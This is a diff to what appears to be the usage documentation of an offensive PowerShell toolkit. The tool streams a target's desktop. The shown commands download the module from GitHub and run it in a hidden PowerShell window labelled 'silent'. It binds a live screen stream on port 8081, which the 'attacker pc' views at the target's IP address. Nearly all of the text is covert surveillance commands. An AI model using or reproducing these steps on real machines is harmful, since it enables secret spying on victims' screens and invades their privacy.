@@ -23,16 +23,18 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Stream
 
 **execute:**
 ```powershell
-#Build trigger script (remote)
-echo "Import-Module -Name $Env:TMP\Stream-TargetDesktop.ps1 -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
-Add-Content -Path "$Env:TMP\trigger.ps1" -Value "TargetScreen -Bind -Port 8081"
+[demo] #Manual execution
+Import-Module -Name "$Env:TMP\Stream-TargetDesktop.ps1" -Force;TargetScreen -Bind -Port 8081
+
+[demo] #Access live stream (attacker pc)
+Start firefox on: "http://${RemoteHost}:8081" #Rhost = target ip addr
 
 
-#Start capture desktop (remote)
-Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"
+#Automatic execution (silent)
+Start-Process -WindowStyle hidden powershell -ArgumentList "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -Force;TargetScreen -Bind -Port 8081";exit
 
-#Access live stream (attacker)
-Start firefox on: "http://${RemoteHost}:8081"
+#Access live stream (attacker pc)
+Start firefox on: "http://${RemoteHost}:8081" #Rhost = target ip addr
 
 
 #Stop stream (remote)
